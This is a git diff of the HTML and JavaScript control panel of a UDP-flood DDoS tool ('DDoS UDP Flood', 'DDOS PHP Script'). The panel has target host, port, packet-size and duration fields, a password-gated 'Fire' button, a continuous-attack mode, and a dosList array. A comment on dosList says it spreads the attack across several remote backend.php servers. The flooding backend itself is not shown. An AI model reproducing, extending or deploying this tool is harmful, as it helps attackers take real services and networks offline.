@@ -15,31 +15,107 @@
 	<title>DDoS UDP Flood</title>
 	<meta http-equiv="content-type" content="text/html;charset=utf-8" />
 	<meta name="generator" content="Geany 1.23.1" />
-	<script>
-		// microAjax - https://github.com/TheZ3ro/microajax/
-		function microAjax(B,A){this.bindFunction=function(E,D){return function(){return E.apply(D,[D])}};this.stateChange=function(D){if(this.request.readyState==4){this.callbackFunction(this.request.responseText)}};this.getRequest=function(){if(window.ActiveXObject){return new ActiveXObject("Microsoft.XMLHTTP")}else{if(window.XMLHttpRequest){return new XMLHttpRequest()}}return false};this.postBody=(arguments[2]||"");this.callbackFunction=A;this.url=B;this.request=this.getRequest();if(this.request){var C=this.request;C.onreadystatechange=this.bindFunction(this.stateChange,this);if(this.postBody!==""){C.open("POST",B,true);C.setRequestHeader("X-Requested-With","XMLHttpRequest");C.setRequestHeader("Content-type","application/x-www-form-urlencoded");C.setRequestHeader("Connection","close")}else{C.open("GET",B,true)}C.send(this.postBody)}};
-	</script>
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="style.css">
 </head>
 <body>
-	<div id="ddos">
-		<button id="loadLag" onClick="javascript:lagConfig();">Lag config</button>
-		<button id="loadTraffic" onClick="javascript:trafficConfig();">Traffic config</button>
-		<br />
-		<label>Host:</label><input type="text" id="host"><br/>
-		<label>Port:</label><input type="number" id="port" max=65535 min=1 step=1 value=80><br/>
-		<label>Packet:</label><input type="number" id="packet" min=1 step=1><br/>
-		<label>Time:</label><input type="number" id="time" min=1 step=1 value=5><br/>
-		<label>Bytes:</label><input type="number" id="bytes" max=65000 min=1 step=1 value=65000><br/>
-		<label>Interval:</label><input type="number" id="interval" max=10000 min=1 step=1 value=10><br/>
-		<label>Pass:</label><input type="text" id="pass"><br/>
-		<button id="send" onClick="javascript:fire();">Fire!</button>
-		<br/><br/>
-		<label>Constant attack with smart delays</label>
-		<button id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
-		<button id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
-		<br/><br/>
-		<textarea id="log" rows="10" cols="50"></textarea>
-	</div>
+		<h1> DDOS PHP Script
+		<small>Security of System</small>
+		</h1>
+		<div id="ddos" class="ddos-wrap">
+			<div action="" class="ddos-form">
+				<div class="row">
+					<div class="col-sm-6">
+						<button class="square-button" id="loadLag" onClick="javascript:lagConfig();">Lag ⚙️</button>
+					</br></br>
+					</div>
+					<div class="col-sm-6">
+						<button class="square-button" id="loadTraffic" onClick="javascript:trafficConfig();">Traffic ⚙️</button>
+					</br></br>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-sm-6">
+					<div class="input-block">
+						<label for="">Host</label>
+						<input type="text" id="host" class="form-control">
+					</div>
+					</div>
+					<div class="col-sm-6">
+					<div class="input-block">
+						<label for="">Port</label>
+						<input type="number" id="port" max=65535 min=1 step=1 value=80 class="form-control">
+					</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-sm-6">
+					<div class="input-block">
+						<label for="">Packet</label>
+						<input type="number" id="packet" min=1 step=1 class="form-control">
+					</div>
+					</div>
+					<div class="col-sm-6">
+					<div class="input-block">
+						<label for="">Time</label>
+						<input type="number" id="time" min=1 step=1 value=60 class="form-control">
+					</div>
+					</div>
+				</div>
+				<div class="row">	
+					<div class="col-sm-6">
+					<div class="input-block">
+						<label for="">Bytes</label>
+						<input type="number" id="bytes" max=65000 min=1 step=1 value=65000 class="form-control">
+					</div>
+					</div>
+					<div class="col-sm-6">
+					<div class="input-block">
+						<label for="">Interval</label>
+						<input type="number" id="interval" max=10000 min=1 step=1 value=10 class="form-control">
+					</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-sm-12">
+						<div class="input-block">
+							<label for="">Password</label>
+							<input type="text" id="pass" class="form-control">
+						</div>
+					</div>
+				</div>
+				<div class="row">
+					<div class="col-sm-12">
+					<button class="square-button" id="send" onClick="javascript:fire();">Fire</button>
+					</br></br>
+					</div>
+				</div>
+				<h2 style="text-align: center">Constant attack with smart delays</h2>
+				<div class="row">
+					<div class="col-sm-6">
+						<button class="square-button" id="sendWithInterval" onClick="javascript:constantAttack(true);">Start</button>
+					</br></br>
+					</div>
+					<div class="col-sm-6">
+					<button class="square-button" id="stopInterval" disabled="true" onClick="javascript:constantAttack(false);">Stop</button>
+					</br></br>
+					</div>
+				</div>
+				<div class="col-sm-12">
+				<div class="input-block textarea">
+					<label for="">Output</label>
+					<textarea id="log" rows="10" cols="50" class="form-control"></textarea>
+				</div>
+				</div>
+			</div>
+		</div>
+
+		<!-- follow on Git -->
+		<div class="made-by">
+		Made by 
+		<a target="_blank" href="https://github.com/robertobarrosx">Roberto Barros</a>
+		</div>
 	<script>
 		var _log=document.getElementById("log");
 		var intervalHandler = null;
@@ -51,23 +127,44 @@
 			var pass=document.getElementById("pass").value;
 			var bytes=document.getElementById("bytes").value;
 			var interval=document.getElementById("interval").value;
-			
-			
+			//dosList is used to place all servers where backend.php
+			// is located thus performing a DDos attack instead of Dos
+			var dosList= [
+				"./",
+			];
 			if(host!="" && pass!=""){
 				inputLock(true);
-				var url='./backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
-				console.log(url);
-				microAjax(url, function(result) { 
-				_log.value=result;
-				if(_log.value.includes("Wrong password")){
-					constantAttack(false);
-				}
-				if(intervalHandler == null){
-					inputLock(false);
-				}
+				i=0;
+				var ajax = [];
+				dosList.forEach(function(dosUrl){
+					var url=dosUrl+'backend.php?pass='+pass+'&host='+host+(port!=""? '&port='+port:'')+(time!=""? '&time='+time:'')+(packet!=""? '&packet='+packet:'')+(bytes!=""? '&bytes='+bytes:'')+(interval!=""? '&interval='+interval:'');
+					console.log(url);
+					ajax[i] = $.ajax({
+						url: url,
+						method: 'POST',
+						data: {},
+						cache: false
+					});
+					i++;
+				});
+				i=0;
+				dosList.forEach(function(dosUrl){
+					$.when(ajax[i]).done(function(data){
+						if(_log.value.includes("Wrong password")){
+							constantAttack(false);
+							_log.value = '';
+						}
+						_log.select();
+						_log.value ='['+dosUrl+']\n'+ data +_log.value
+						if(intervalHandler == null){
+							inputLock(false);
+						}
+					});
+					i++;
 				});
 			}
 			else{
+				_log.select();
 				_log.value = "Not all required parameters are filled correctly!"
 			}
 		}
@@ -81,7 +178,7 @@
 		
 		function trafficConfig(){
 			packet=document.getElementById("packet").value = "";
-			time=document.getElementById("time").value = "5";
+			time=document.getElementById("time").value = "60";
 			bytes=document.getElementById("bytes").value = "65000";
 			interval=document.getElementById("interval").value = "10";
 		}
@@ -103,6 +200,7 @@
 				}
 			}
 			else{
+				_log.select();
 				_log.value = "Not all required parameters are filled correctly!"
 			}
 		}
@@ -133,6 +231,35 @@
 				document.getElementById("stopInterval").disabled = true;
 			}
 		}
+	</script>
+	<!--Design script-->
+	<script>
+	//material ddos form animation
+		$('.ddos-form').find('.form-control').each(function() {
+		var targetItem = $(this).parent();
+		if ($(this).val()) {
+			$(targetItem).find('label').css({
+			'top': '10px',
+			'fontSize': '14px'
+			});
+		}
+		})
+		$('.ddos-form').find('.form-control').focus(function() {
+		$(this).parent('.input-block').addClass('focus');
+		$(this).parent().find('label').animate({
+			'top': '10px',
+			'fontSize': '14px'
+		}, 300);
+		})
+		$('.ddos-form').find('.form-control').blur(function() {
+		if ($(this).val().length == 0) {
+			$(this).parent('.input-block').removeClass('focus');
+			$(this).parent().find('label').animate({
+			'top': '25px',
+			'fontSize': '18px'
+			}, 300);
+		}
+		})
 	</script>
 </body>
 </html>
